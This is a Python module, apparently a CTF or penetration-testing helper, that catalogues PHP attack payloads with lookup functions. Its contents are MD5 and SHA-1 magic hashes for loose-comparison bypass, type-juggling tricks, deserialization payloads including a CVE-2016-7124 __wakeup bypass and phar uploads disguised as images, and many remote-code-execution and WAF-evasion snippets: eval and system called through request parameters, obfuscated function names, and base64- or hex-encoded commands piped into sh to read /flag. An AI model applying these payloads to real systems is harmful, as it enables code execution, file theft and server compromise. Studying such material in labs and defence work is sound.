# -*- coding: utf-8 -*-
"""PHP 技巧模块.

覆盖:
    - 弱类型比较 / 类型戏法 (Type Juggling)
    - Magic Hash (0e 开头)
    - 反序列化技巧
    - 变量覆盖
    - 正则绕过 (preg_replace / ereg)
    - 伪随机数种子攻击
"""
from typing import List, Dict


# ═══════════════════════════════════════════════════════════
#  Magic Hash (0e 开头 — 弱比较绕过)
# ═══════════════════════════════════════════════════════════

MAGIC_HASHES: Dict[str, List[str]] = {
    "MD5 (0e...)": [
        "240610708",    # 0e462097431906509019562988736854
        "QLTHNDT",      # 0e405967825401955372549139051580
        "QNKCDZO",      # 0e830400451993494058024219903391
        "PJNPDWY",      # 0e291529052894702774557631701704
        "NWWKITQ",      # 0e763082070976034347537360607673
        "NOOPCJF",      # 0e818888003657176127862245791911
        "MMHUWUV",      # 0e701732711630150438129209816536
        "MAUXXQC",      # 0e478478466848439040434801845301
        "IHKFRNS",      # 0e256160682445802696926137988570
        "GZECLQZ",      # 0e537612579746236890713144760332
        "GGHMVOE",      # 0e362766013028313274586933780773
        "GEGHBXL",      # 0e248776895502908863709440713467
        "EEIZDOI",      # 0e782601363539291779881938905162
        "DYAXWCA",      # 0e424759758842488633464374063001
        "DQWRASX",      # 0e742373665639232907775599582643
        "BRTKUJZ",      # 0e576404779613338487177472767040
        "ABJIHVY",      # 0e755264355178451322893275696586
        "aabg7XSs",     # 0e087386482136013740957780965295
        "aabC9RqS",     # 0e041022518165728065734349536299
        "s878926199a",  # 0e545993274517709034328855841020
        "s155964671a",  # 0e342768416822451524974117254469
        "s214587387a",  # 0e848240448830537924465865611904
        "s1091221200a", # 0e940624217856561557816327384675
    ],
    "SHA-1 (0e...)": [
        "aaroZmOk",     # 0e66507019969427134894567494305185566735...
        "aaK1STfY",     # 0e76658526655756207688271159624026011393...
        "aaO8zKZF",     # 0e89257456677279068558073954252716165668...
        "aa3OFF9m",     # 0e36977786278517984959260394024281014729...
    ],
}

# ═══════════════════════════════════════════════════════════
#  PHP 弱类型比较
# ═══════════════════════════════════════════════════════════

TYPE_JUGGLING: Dict[str, List[Dict[str, str]]] = {
    "字符串 vs 数字": [
        {"name": "字符串转 0", "example": "'abc' == 0  → true"},
        {"name": "任意值绕过", "example": "?password[]=  (数组 vs 字符串)"},
        {"name": "科学计数法", "example": "'1e1' == '10' → true"},
        {"name": "NULL 绕过", "example": "'0' == false → true, 0 == '0' → true"},
    ],
    "strcmp 绕过": [
        {"name": "数组绕过", "example": "?password[]=anything  # strcmp 返回 NULL"},
        {"name": "空值绕过", "example": "?password=  (空字符串)"},
    ],
    "switch 弱类型": [
        {"name": "switch 0 绕过", "example": "switch(0){case 'abc': ...} → 匹配!"},
    ],
    "in_array 弱类型": [
        {"name": "in_array 绕过", "example": "in_array(0, ['abc', 'def']) → true!"},
    ],
    "preg_match 绕过": [
        {"name": "数组污染", "example": "preg_match('/^[a-z]+$/', []) → false"},
        {"name": "PCRE 回溯限制", "example": "1MB 垃圾数据 + 你的 payload → 绕过正则"},
    ],
}

# ═══════════════════════════════════════════════════════════
#  反序列化 Payload
# ═══════════════════════════════════════════════════════════

DESERIALIZATION: Dict[str, List[str]] = {
    "__wakeup 绕过": [
        "CVE-2016-7124: 修改序列化对象属性数量使其大于实际值",
        "当属性数 > 实际属性数时, __wakeup 不会被调用",
        "O:4:\"User\":2:{s:4:\"name\";s:4:\"test\";}  → O:4:\"User\":5:{s:4:\"name\";s:4:\"test\";}",
    ],
    "基础反序列化 Payload": [
        'O:8:"stdClass":0:{}',                                    # 空对象
        'O:4:"Test":1:{s:4:"file";s:11:"/etc/passwd";}',          # 简单对象
        'a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}',                     # 数组
        'C:11:"ArrayObject":21:{x:i:0;a:0:{};m:a:0:{}}',          # 自定义序列化
    ],
    "Phar 反序列化": [
        "phar://uploaded.jpg/shell.php",   # 将 phar 伪装成 jpg 上传
        "phar://./uploaded.jpg/test.txt",  # 绕过文件存在检查
    ],
}

# ═══════════════════════════════════════════════════════════
#  PHP 代码执行 Bypass
# ═══════════════════════════════════════════════════════════

PHP_RCE_BYPASS: Dict[str, List[str]] = {
    "命令执行 - 无字母数字": [
        "$_=[];$__=$_.__;$_=($_==$__);$___=$_+$_;$__=++$_;$___=$__+$_;...",
        r"用位运算: $__=(''==''); $__=$__.$__; $_=$__[0].$__[0]; ...",
    ],
    "常见命令执行函数": [
        "system('id')", "exec('id')", "passthru('id')",
        "shell_exec('id')", "popen('id','r')",
        "proc_open('id',[],$p)", "pcntl_exec('/bin/sh')",
        "`id`", "eval('system(\"id\");')",
        "assert('system(\"id\")')",
        "preg_replace('/.*/e','system(\"id\")','')",  # /e 修饰符 (PHP<7)
        "create_function('','system(\"id\")')();",
        "array_map('system',['id'])",
        "array_walk(['id'],'system')",
    ],
    "WAF绕过-双写": [
        "eval → evaleval", "assert → asserassertt",
        "system → syssystemtem", "exec → exexecec",
        "@ini_set → @ini@ini_setset",
    ],
    "WAF绕过-大小写": [
        "Eval / eVaL / EvAl", "System / SYSTEM / syStem",
        "PhpInfo / phpinfo",
    ],
    "WAF绕过-函数替换": [
        "eval → assert", "eval → preg_replace('/.*/e',...)",
        "system → shell_exec / passthru / exec",
        "反引号命令: `id`",
    ],
    "WAF绕过-可变函数": [
        "$_GET['a']($_GET['b']);", "$_POST['f']($_POST['p']);",
        "$func = $_REQUEST['c']; $func();",
    ],
    "WAF绕过-字符串拼接": [
        "$a='sy'.'stem'; $a('id');",
        "$b='ev'.'al'; $b($_POST[1]);",
    ],
    "WAF绕过-编码执行": [
        "base64_decode('ZXZhbCgkX1BPU1RbMV0p');",
        "gzinflate(base64_decode('压缩数据'));",
        "str_rot13('riny') → eval",
    ],
    "WAF绕过-反斜杠分割": [
        "\\s\\y\\s\\t\\e\\m('id');",
        "\\e\\v\\a\\l(\\$_POST[1]);",
        "PHP 函数名允许反斜杠",
    ],
    "WAF绕过-超级全局变量": [
        "$GLOBALS['_GET']['_']($GLOBALS['_GET']['__']);",
        "$_ = 'system'; $_('id');",
    ],
    "WAF绕过-create_function": [
        "create_function('', $_GET['c']);",
        "create_function('', 'return '.$_POST['code'].';')();",
    ],
    "WAF绕过-call_user_func": [
        "call_user_func('system', 'id');",
        "call_user_func_array('assert', [$_POST[1]]);",
    ],
    "WAF绕过-数组存储": [
        "$a=['system','id']; $a[0]($a[1]);",
        "$a=['eval',$_POST[1]]; $a[0]($a[1]);",
    ],
    "常见 Bypass 技巧": [
        "空格: cat${IFS}/flag 或 cat<>/flag 或 {cat,/flag}",
        "斜杠: cat $(echo L2ZsYWc=|base64 -d)",
        "关键字: c''at /fl''ag 或 c\at /fl\ag",
        "base64: echo 'Y2F0IC9mbGFn' | base64 -d | sh",
        "hex: echo '636174202f666c6167' | xxd -r -p | sh",
        "通配符: /???/c?t /???/f??g",
        "环境变量: cat $HOME/flag.txt",
        "printf: $(printf '\\143\\141\\164\\40\\57flag')",
    ],
    "disable_functions 绕过": [
        "LD_PRELOAD 注入: mail() + putenv()",
        "FFI::cdef (PHP 7.4+)",
        "ImageMagick 利用 (GhostScript)",
        "利用未禁用的函数: proc_open, pcntl_exec, dl",
        "PHP-FPM 未授权访问 (利用 Gopher 协议)",
        "利用 UAF / heap overflow (高级)",
    ],
}


def get_magic_hashes(algo: str = "") -> dict:
    """获取 Magic Hash (0e 开头)."""
    if algo and algo.upper() in MAGIC_HASHES:
        return {algo.upper(): MAGIC_HASHES[algo.upper()]}
    return MAGIC_HASHES


def get_type_juggling() -> dict:
    """获取弱类型比较 Payload."""
    return TYPE_JUGGLING


def get_deserialization() -> dict:
    """获取反序列化 Payload."""
    return DESERIALIZATION


def get_rce_bypass() -> dict:
    """获取 PHP RCE Bypass 技巧."""
    return PHP_RCE_BYPASS


def search_keyword(keyword: str) -> list:
    """在所有 PHP Payload 中搜索."""
    results = []
    all_data = {**MAGIC_HASHES, **PHP_RCE_BYPASS}
    for section, items in all_data.items():
        for item in (items if isinstance(items, list) else []):
            item_str = str(item)
            if keyword.lower() in item_str.lower():
                results.append({"section": section, "content": item_str})
    return results
